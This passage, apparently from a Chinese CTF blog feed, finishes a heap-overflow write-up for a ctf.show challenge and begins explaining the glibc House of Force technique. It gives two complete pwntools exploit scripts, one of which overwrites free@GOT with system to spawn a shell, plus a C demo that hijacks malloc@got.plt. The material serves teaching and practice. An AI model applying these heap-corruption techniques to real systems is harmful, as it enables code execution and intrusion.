src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133318.png" alt="bss段"></p><p>打开edit_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022134629.png" alt="edit_heap"></p><p>可以再次编辑 chunk 的内容，⽽且可以选择输⼊⼤⼩。如果我们这次输⼊的 size ⽐创建时⼤的话，就会导致堆溢出</p><p>（read_input(heaparray[v1], v2)：向 chunk 中写⼊ v2 ⼤⼩的内容，也就是说如果 v2 ⽐ create 时的 size ⼤的话就会造成堆溢出。）</p><p>那么我们就可以用House of Spirit</p><p>攻击思路：</p><ol><li>首先创建俩个chunk，chunk0大小为0x10，chunk1的大小为0x60</li><li>然后删除chunk1</li><li>编辑chunk0造成堆溢出，修改chunk1的fd指针为0x000000000060208d</li><li>创建两个chunk大小都为0x60，第一个内容随意，第二个要构造payload覆盖magic的值</li><li>getflag</li></ol><p>需要注意的一点是，在我们修改fd指针时，需要连到一个合法的chunk头，</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144519.png" alt="内存分布"></p><p>这就是一个合法的chunk头，大小为0x70</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144814.png" alt="内存分布"></p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x23</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>payload2 = p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload2) , payload2)<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p>这题一样可以用Arbitrary Alloc攻击，关于fastbin攻击等我研究透彻会进行总结，这里先贴个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x3</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x1BF60</span>)<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>getflag()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Force攻击</title>
    <link href="/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure><p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">remainder      = chunk_at_offset(victim, nb);<br>av-&gt;top        = remainder;<br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p><strong>与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size   = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过 HOF 来篡改 <code>malloc@got.plt</code> 实现劫持程序流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> *ptr,*ptr2;<br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr=(<span class="hljs-type">long</span> *)(((<span class="hljs-type">long</span>)ptr)+<span class="hljs-number">24</span>);<br>    *ptr=<span class="hljs-number">-1</span>;        <span class="hljs-comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">-4120</span>);  <span class="hljs-comment">// &lt;=== 减小top chunk指针</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);   <span class="hljs-comment">// &lt;=== 分配块实现任意地址写</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，我们分配一个 0x10 字节大小的块</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x0000000000020fe1 &lt;=== top chunk<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>xffffffffffffffff &lt;=== top chunk size域被更改<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:    <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000602020 &lt;=== top chunk此时一切正常<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x601020</span>:   <span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7a91130</span> &lt;=== malloc@got.plt<br></code></pre></td></tr></table></figure><p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p><p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p><p>0x601010-0x602020&#x3D;-4112</p><p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br></code></pre></td></tr></table></figure><p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ (sizeof(size_t))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- 